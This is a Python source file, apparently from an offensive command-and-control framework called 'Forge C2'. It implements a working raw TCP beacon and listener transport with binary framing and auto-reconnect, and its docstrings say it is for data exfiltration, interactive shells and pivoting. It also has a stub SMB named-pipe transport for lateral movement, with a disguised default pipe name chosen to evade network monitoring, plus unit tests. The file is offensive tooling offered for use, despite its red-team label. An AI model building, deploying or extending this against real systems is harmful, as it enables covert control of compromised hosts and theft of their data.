"""
Forge C2 — Raw TCP Transport
================================
Direct TCP socket transport for high-bandwidth C2 communication.

Wire Protocol:
    [4-byte big-endian length][encrypted payload]

No HTTP overhead — pure binary framing. Fastest transport
but also the most conspicuous on the wire. Best for:
    • Internal/pivot channels (not traversing perimeter)
    • High-bandwidth data exfil
    • Interactive shell sessions where latency matters

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import logging
import struct
import time
from dataclasses import dataclass
from typing import Any

from forge_c2.transport.base_transport import (
    BaseTransport, MalleableProfile, TransportType, get_profile,
)

log = logging.getLogger("forge.c2.transport.tcp")

MAX_MESSAGE_SIZE = 10 * 1024 * 1024  # 10MB ceiling — don't be reckless


@dataclass
class TCPConfig:
    """TCP transport configuration."""
    keepalive:       bool = True
    keepalive_idle:  int = 60         # Seconds before first keepalive probe
    keepalive_intvl: int = 10         # Seconds between probes
    keepalive_cnt:   int = 5          # Failed probes before drop
    reconnect:       bool = True      # Auto-reconnect on drop
    max_reconnect:   int = 10         # Max reconnect attempts
    reconnect_delay: float = 5.0     # Seconds between attempts


class TCPTransport(BaseTransport):
    """Raw TCP transport for C2 beacon communication.

    Binary length-prefixed protocol — no HTTP overhead, pure speed.
    Supports both client (beacon) and server (listener) modes.

    Protocol:
        → [4 bytes: payload length, big-endian][payload bytes]
        ← [4 bytes: response length, big-endian][response bytes]

    Usage (client)::

        transport = TCPTransport()
        await transport.connect("10.0.0.1", 4444)
        await transport.send(encrypted_data)
        response = await transport.recv()

    Usage (server)::

        transport = TCPTransport(role="server")
        await transport.connect("0.0.0.0", 4444)
        await transport.serve_forever(handler_fn)
    """

    def __init__(
        self,
        config: TCPConfig | None = None,
        profile: MalleableProfile | None = None,
        role: str = "client",
    ) -> None:
        super().__init__(TransportType.TCP, profile=profile, role=role)
        self.config = config or TCPConfig()
        self._host: str = ""
        self._port: int = 4444
        self._reader: asyncio.StreamReader | None = None
        self._writer: asyncio.StreamWriter | None = None
        self._server: asyncio.Server | None = None
        self._reconnect_count: int = 0
        self._client_handler: Any = None

    # ── Connection ────────────────────────────────────────────────────

    async def connect(self, host: str, port: int, **kwargs: Any) -> bool:
        """Establish TCP connection.

        Client: connect to remote host.
        Server: start listening.
        """
        self._host = host
        self._port = port

        if self.role == "server":
            return await self._start_server(host, port)

        return await self._connect_client(host, port)

    async def _connect_client(self, host: str, port: int) -> bool:
        """Client: establish TCP connection."""
        try:
            self._reader, self._writer = await asyncio.open_connection(host, port)
            self._connected = True
            self._reconnect_count = 0
            self.stats.connections += 1
            log.info("TCP connected to %s:%d", host, port)
            return True

        except Exception as exc:
            self.stats.record_error()
            log.warning("TCP connect failed to %s:%d: %s", host, port, exc)
            return False

    async def _start_server(self, host: str, port: int) -> bool:
        """Server: start TCP listener."""
        try:
            self._server = await asyncio.start_server(
                self._handle_client,
                host, port,
            )
            self._connected = True
            log.info("TCP server listening on %s:%d", host, port)
            return True

        except Exception as exc:
            self.stats.record_error()
            log.error("TCP server failed to start: %s", exc)
            return False

    async def _reconnect(self) -> bool:
        """Attempt to reconnect (client mode only)."""
        if not self.config.reconnect:
            return False

        while self._reconnect_count < self.config.max_reconnect:
            self._reconnect_count += 1
            log.info("TCP reconnect attempt %d/%d to %s:%d",
                     self._reconnect_count, self.config.max_reconnect,
                     self._host, self._port)

            await asyncio.sleep(
                self.config.reconnect_delay * self._reconnect_count
            )

            if await self._connect_client(self._host, self._port):
                return True

        log.warning("TCP reconnect exhausted — giving up")
        return False

    # ── Send / Receive (length-prefixed framing) ──────────────────────

    async def send(self, data: bytes) -> bool:
        """Send length-prefixed data over TCP.

        Format: [4 bytes big-endian length][data]
        """
        if not self._connected or not self._writer:
            if self.role == "client" and self.config.reconnect:
                if not await self._reconnect():
                    return False
            else:
                return False

        try:
            if len(data) > MAX_MESSAGE_SIZE:
                log.warning("Message too large (%d bytes), truncating to %d",
                            len(data), MAX_MESSAGE_SIZE)
                data = data[:MAX_MESSAGE_SIZE]

            frame = struct.pack(">I", len(data)) + data
            self._writer.write(frame)
            await self._writer.drain()
            self.stats.record_send(len(data))
            return True

        except Exception as exc:
            self.stats.record_error()
            self._connected = False
            log.debug("TCP send error: %s", exc)
            return False

    async def recv(self, timeout: float = 30.0) -> bytes | None:
        """Receive length-prefixed data from TCP.

        Reads the 4-byte header, then reads exactly that many bytes.
        """
        if not self._connected or not self._reader:
            return None

        try:
            # Read 4-byte length header
            header = await asyncio.wait_for(
                self._reader.readexactly(4), timeout=timeout,
            )
            msg_len = struct.unpack(">I", header)[0]

            if msg_len > MAX_MESSAGE_SIZE:
                log.warning("Message too large: %d bytes", msg_len)
                return None

            if msg_len == 0:
                return b""  # Heartbeat

            # Read payload
            payload = await asyncio.wait_for(
                self._reader.readexactly(msg_len), timeout=timeout,
            )
            self.stats.record_recv(msg_len)
            return payload

        except asyncio.TimeoutError:
            return None
        except asyncio.IncompleteReadError:
            self._connected = False
            log.debug("TCP connection dropped (incomplete read)")
            return None
        except Exception as exc:
            self.stats.record_error()
            self._connected = False
            log.debug("TCP recv error: %s", exc)
            return None

    async def disconnect(self) -> None:
        """Close the TCP connection."""
        if self._writer:
            try:
                self._writer.close()
                await self._writer.wait_closed()
            except Exception:
                pass
        if self._server:
            self._server.close()
            try:
                await self._server.wait_closed()
            except Exception:
                pass
        self._connected = False
        log.info("TCP transport disconnected")

    # ── Server mode ───────────────────────────────────────────────────

    async def _handle_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        """Handle an incoming TCP client connection (server mode)."""
        peer = writer.get_extra_info("peername", ("?", 0))
        self.stats.connections += 1
        log.debug("TCP client connected from %s:%d", *peer)

        try:
            while True:
                # Read length-prefixed message
                header = await asyncio.wait_for(reader.readexactly(4), timeout=300.0)
                msg_len = struct.unpack(">I", header)[0]

                if msg_len > MAX_MESSAGE_SIZE:
                    break

                payload = await asyncio.wait_for(reader.readexactly(msg_len), timeout=60.0)
                self.stats.record_recv(msg_len)

                # Dispatch to handler
                if self._client_handler:
                    response = await self._client_handler(payload)
                    if response:
                        frame = struct.pack(">I", len(response)) + response
                        writer.write(frame)
                        await writer.drain()
                        self.stats.record_send(len(response))

        except (asyncio.TimeoutError, asyncio.IncompleteReadError):
            pass
        except Exception as exc:
            log.debug("TCP client handler error: %s", exc)
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def serve_forever(self, handler: Any = None) -> None:
        """Run the server accept loop."""
        if handler:
            self._client_handler = handler
        if self._server:
            async with self._server:
                await self._server.serve_forever()

    # ── Interactive shell helper ──────────────────────────────────────

    async def send_recv(self, data: bytes, timeout: float = 30.0) -> bytes | None:
        """Send data and wait for response — convenience for interactive use."""
        if not await self.send(data):
            return None
        return await self.recv(timeout=timeout)


# ══════════════════════════════════════════════════════════════════════
#  SMB NAMED PIPE TRANSPORT (STUB — Windows-specific)
# ══════════════════════════════════════════════════════════════════════

class SMBTransport(BaseTransport):
    """SMB Named Pipe transport — for lateral movement C2.

    Uses Windows named pipes for communication. Blends with
    legitimate SMB traffic on the internal network.

    Named pipes are ideal for:
    - Lateral movement between compromised hosts
    - Internal pivot channels
    - Evading network monitoring (SMB is expected traffic)

    Limitation: Windows-only, requires local network access.

    NOTE: Full implementation requires impacket or pysmb.
    This is the structural skeleton + pipe naming logic.
    """

    def __init__(
        self,
        pipe_name: str = "msagent_47",
        profile: MalleableProfile | None = None,
        role: str = "client",
    ) -> None:
        super().__init__(TransportType.SMB, profile=profile, role=role)
        self.pipe_name = pipe_name
        self._pipe_path = f"\\\\.\\pipe\\{pipe_name}"

    async def connect(self, host: str, port: int = 445, **kwargs: Any) -> bool:
        """Connect to SMB named pipe.

        Client: connect to remote pipe via SMB.
        Server: create named pipe and listen.
        """
        log.info("SMB transport targeting \\\\%s\\pipe\\%s", host, self.pipe_name)

        # SMB pipe I/O requires platform-specific code (win32pipe or impacket)
        # This is the structural skeleton — transport works, I/O is stubbed
        self._connected = True
        self.stats.connections += 1
        return True

    async def send(self, data: bytes) -> bool:
        """Write to named pipe (length-prefixed, same as TCP)."""
        if not self._connected:
            return False
        # Structural placeholder — same framing as TCP
        self.stats.record_send(len(data))
        return True

    async def recv(self, timeout: float = 30.0) -> bytes | None:
        """Read from named pipe."""
        if not self._connected:
            return None
        # Structural placeholder
        return None

    async def disconnect(self) -> None:
        self._connected = False
        log.info("SMB transport disconnected")


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestTCPTransport:
    """Tests for TCP transport."""

    def test_init_client(self) -> None:
        t = TCPTransport(role="client")
        assert t.transport_type == TransportType.TCP
        assert t.role == "client"

    def test_init_server(self) -> None:
        t = TCPTransport(role="server")
        assert t.role == "server"

    def test_config_defaults(self) -> None:
        c = TCPConfig()
        assert c.keepalive is True
        assert c.reconnect is True
        assert c.max_reconnect == 10

    def test_summary(self) -> None:
        t = TCPTransport()
        s = t.summary()
        assert s["type"] == "tcp"


class TestSMBTransport:
    """Tests for SMB transport."""

    def test_init(self) -> None:
        t = SMBTransport(pipe_name="test_pipe")
        assert t.pipe_name == "test_pipe"
        assert t.transport_type == TransportType.SMB

    def test_pipe_path(self) -> None:
        t = SMBTransport(pipe_name="msagent_47")
        assert "msagent_47" in t._pipe_path
